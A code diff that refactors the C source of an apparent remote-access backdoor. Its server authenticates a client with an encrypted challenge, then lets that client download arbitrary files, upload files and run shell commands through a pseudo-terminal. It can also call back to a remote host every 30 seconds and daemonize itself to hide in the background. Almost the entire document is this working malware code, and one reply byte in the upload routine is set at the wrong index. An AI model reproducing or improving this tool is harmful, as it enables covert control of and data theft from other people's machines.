@@ -3,89 +3,107 @@
 #include "app.h"
 #include "connection.h"
 
-char message[BUFSIZE + 5];
-int msg_len;	
+char send_msg_buf[MSGSIZE + 5], recv_msg_buf[MSGSIZE + 5];
+int send_msg_len, recv_msg_len;	
 
-bool init_server(){
+int init_server(){
 	byte IV[40];
 	byte *IV1 = IV;
 	byte *IV2 = IV + 20;
 	recv_data(IV, 40, 0);
-	//for(int i = 0; i < 40; ++i)
-		//printf("%02x ", IV[i]);
-	//printf("\n");
+#ifdef DEBUG
+	printf("[+]: The key: ");
+	for(int i = 0; i < 40; ++i)
+		printf("%02x ", IV[i]);
+	printf("\n");
+#endif
 	setup_context(&send_ctx, key, IV2);
 	setup_context(&recv_ctx, key, IV1);
-	//printf("here\n");
-	if(recv_msg(message, &msg_len) == FAILURE) return false;
-	//printf("client.c:20\n");
-	if(msg_len != 16 || memcmp(message, challenge, 0x10)) return false;
-	//printf("Authen done\n");
+	recv_msg(recv_msg_buf, &recv_msg_len);
+	if(recv_msg_len != 16 || memcmp(recv_msg_buf, challenge, 0x10)) return 8;
 	send_msg(challenge, 0x10);
-	return true;
+	return 0;
 }
 
-bool get_file(){
-	char file_path[BUFSIZE + 5] = {0};
-	char message[BUFSIZE + 5] = {0};
-	int file_path_len;
+int get_file(){
 	int fd;
-	int i, sum = 0;
+	int sum = 0;
+	char response;
 	struct stat s_buf;
-	recv_msg(file_path, &file_path_len);
-	//printf("%d\n", file_path_len);
-	file_path[file_path_len] = '\0';
-	stat(file_path, &s_buf);
-	if(!S_ISREG(s_buf.st_mode)) return false;
-	printf("%s\n", file_path);
+	recv_msg(recv_msg_buf, &recv_msg_len);	//file path
+	if(recv_msg_len == 1 && recv_msg_buf[0] == 0) return 12;
+	recv_msg_buf[recv_msg_len] = '\0';
+	stat(recv_msg_buf, &s_buf);
+	if(!S_ISREG(s_buf.st_mode)){
+		send_msg_buf[0] = 0;
+		send_msg(send_msg_buf, 1);
+		return 11;
+	}
+	else{
+		send_msg_buf[0] = 1;
+		send_msg(send_msg_buf, 1);
+	}
+#ifdef DEBUG
+	printf("[+]: file path: %s\n", recv_msg_buf);
+#endif
 	//can't find the specify file case
-	if((fd = open(file_path, O_RDONLY)) < 0) return false;
+	if((fd = open(recv_msg_buf, O_RDONLY)) < 0) return 19;
 	while(1){
-		i = read(fd, message, BUFSIZE);
-		//printf("%d\n", i);
-		if(i <= 0) break;
-		send_msg(message, i);
-		sum += i;
+		send_msg_len = read(fd, send_msg_buf, BUFSIZE);
+		if(send_msg_len <= 0) break;
+		send_msg(send_msg_buf, send_msg_len);
+		sum += send_msg_len;
 	}
+#ifdef DEBUG
+	printf("[+]: Send %d bytes\n", sum);
+#endif
 	close(fd);
-	return true;
+	return 0;
 }
 
-bool put_file(){
+int put_file(){
 	int fd;
-	int i, sum = 0;
-	int file_path_len;
-	int flag;
-	char file_path[BUFSIZE + 5] = {0};
-	recv_msg(file_path, &file_path_len);
-	file_path[file_path_len] = '\0';
-	//printf("%s\n", file_path);
-	if((fd = creat(file_path, 0644)) < 0){
-		printf("%d\n", fd);	
-		return false; //to be perfected
+	int sum = 0;
+	char flag;
+	recv_msg(recv_msg_buf, &recv_msg_len);	//file path
+	if(recv_msg_len == 1 && recv_msg_buf[0] == 0) return 11;
+	recv_msg_buf[recv_msg_len] = '\0';
+#ifdef DEBUG
+	printf("[+]: File path: %s\n", recv_msg_buf);
+#endif
+	if((fd = creat(recv_msg_buf, 0644)) < 0){
+		send_msg_buf[0] = 0;
+		send_msg(send_msg_buf, 1);
+		return 14;
 	}
-	while(1){	//to be perfected
-		flag = recv_msg(message, &i);	//to be perfected
-		//printf("%d\n", i);
-		if(flag == false || i <= 0) break;
-		if(write(fd, message, i) != i) return false; //exception handling;
-		sum += i;
+	else{
+		send_msg_buf[1] = 1;
+		send_msg(send_msg_buf, 1);
 	}
+	while(1){
+		recv_msg(recv_msg_buf, &recv_msg_len);
+		if(recv_msg_len <= 0) break;
+		write(fd, recv_msg_buf, recv_msg_len);
+		sum += recv_msg_len;
+	}
+#ifdef DEBUG
+	printf("[+]: Receive %d bytes\n", sum);
+#endif
 	close(fd);
-	return true;
+	return 0;
 }
 
-bool run_shell(){
+int run_shell(){
 	fd_set rd;
 	int pty, tty, pid;
 	int tmp;
-	int ret;
 	if(openpty(&pty, &tty, NULL, NULL, NULL ) < 0)
 		return false;
-	if(recv_msg(message, &msg_len) == false) return false;
-	message[msg_len] = '\0';
-	//printf("%s\n", message);
-	if((pid = fork()) < 0) return false;
+	recv_msg(recv_msg_buf, &recv_msg_len);
+	recv_msg_buf[recv_msg_len] = '\0';
+	if(recv_msg_len <= 0) return 18;
+	pid = fork();
+	if(pid < 0) return false;
 	if(pid){
 		close(tty);
 		while(1){
@@ -96,21 +114,14 @@ bool run_shell(){
 			if(select(tmp + 1, &rd, NULL, NULL, NULL) < 0)
 				return false;
 			if(FD_ISSET(client, &rd)){
-				ret = recv_msg(message, &msg_len);
-				//printf("%d\n", ret);
-				if(ret == 0) break;
-				if(ret < 0) return false;
-				//message[len] = '\0';
-				//printf(">%s\n", message);
-				write(pty, message, msg_len);
+				recv_msg(recv_msg_buf, &recv_msg_len);
+				if(recv_msg_len <= 0) break;
+				write(pty, recv_msg_buf, recv_msg_len);
 			}
 			if(FD_ISSET(pty, &rd)){
-				ret = read(pty, message, BUFSIZE);	//message length should less than BUFSIZEp
-				//printf("%d\n", ret);
-				if(ret <= 0) break;
-				//if(ret < 0) return false;
-				//printf("%d\n", len);
-				send_msg(message, ret);
+				send_msg_len = read(pty, send_msg_buf, MSGSIZE);	//message length should less than BUFSIZEp
+				if(send_msg_len <= 0) break;
+				send_msg(send_msg_buf, send_msg_len);
 			}
 		}
 		//printf("here\n");
@@ -125,24 +136,24 @@ bool run_shell(){
 		dup2( tty, 1 );
 		dup2( tty, 2 );
 		if( tty > 2 ) close( tty );
-		execl("/bin/sh", "sh", "-c", message, (char *)0);
+		execl("/bin/sh", "sh", "-c", recv_msg_buf, (char *)0);
 		exit(0);
 	}
-	return true;
+	return 0;
 }
 
-bool service(){
+int service(){
 	struct sockaddr_in addr;
-	int addr_len;
+	socklen_t addr_len = sizeof(struct sockaddr);
 	char command_msg;
-	int cmd_msg_len, flag;
+	int cmd_msg_len;
 	int pid;
+	int ret;
 	while(1){
 #ifndef REVERSE
-		//whether the output shoule be added
 		if((client = accept(server, (struct sockaddr *)&addr, &addr_len)) < 0){
 			close(server);
-			return false;
+			return 17;
 		}
 		pid = fork();
 		if(pid < 0){
@@ -154,8 +165,8 @@ bool service(){
 			close(client);
 			continue;
 		}
+		close(server);
 #else
-		struct sockaddr_in addr;
 		sleep(30);
 		if((client = socket(AF_INET, SOCK_STREAM, 0)) < 0)
 			continue;
@@ -168,36 +179,31 @@ bool service(){
 			continue;
 		}
 #endif
-		//printf("here\n");
-		if(init_server() == FAILURE) return false;
-		if(recv_msg(&command_msg, &cmd_msg_len) == FAILURE) return false;
-		//printf("here\n");
-		//printf("msg_len %d\n", msg_len);
-		//printf("%02x\n", command_msg);
+		if(ret = init_server()) return ret;
+		recv_msg(&command_msg, &cmd_msg_len);
+		if(cmd_msg_len <= 0) return 18;
 		switch(command_msg){
-			case GET_FILE:flag = get_file();break;
-			case PUT_FILE:flag = put_file();break;
-			case RUN_SHELL:flag = run_shell();break;
+			case GET_FILE:ret = get_file();break;
+			case PUT_FILE:ret = put_file();break;
+			case RUN_SHELL:ret = run_shell();break;
 			default:;
 		}
 		shutdown(client, 2);
-		//if(flag == false) break;
-		//printf("reset\n");
+		return ret;
 	}
-	return true;
+	return 0;
 }
 
 void usage(){
-	printf("\t-f\tforward connection,default mode.\n");
-	printf("\t-r\treverse connection.\n");
-	printf("\t-i\tip address.\n");
-	printf("\t-p\tport.\n");
-	printf("\t-h\tprint help message.");
+	printf("\t-h host\tIp address.\n");
+	printf("\t-p port\tListen port.\n");
+	printf("\t-u\tPrint help message.");
 	exit(0);
 }
 
 int main(int argc, char *argv[]){
 	int ch, pid, i;
+	int ret;
 #ifdef BACKGROUND
 	pid = fork();
 	if(pid < 0) return -1;
@@ -205,27 +211,33 @@ int main(int argc, char *argv[]){
 	if(setsid() < 0) return -1;
 	for(i = 0; i < 1024; ++i) close(i);
 #endif
-	while((ch = getopt(argc, argv, "hi:p:")) != -1){
+	while((ch = getopt(argc, argv, "h:p:u")) != -1){
 		switch(ch){
-			case 'i':
-				host = inet_addr(optarg);
+			case 'h':
+				if((host = inet_addr(optarg)) == INADDR_NONE){
+					ret = 1; EXIT;
+				}
 				break;
 			case 'p':
-				port = atoi(optarg);
+				if((port = atoi(optarg)) == 0){
+					ret = 2; EXIT;
+				}
 				break;
-			case 'h':
-				usage();
-				break;
+			case 'u':
+				usage(); break;
 			default:
 				printf("Existence of unidentified parameters\n");
+				exit(0);
 		}
 	}
 #ifndef REVERSE
-	create_server_socket();
+	if(ret = create_server_socket()) EXIT;
 #endif
-	service();
+	if(ret = service()) EXIT;
 #ifndef REVERSE
 	close(server);
 #endif
+	return 0;
+catch:	handle_error(ret);
 	return 0;
 }
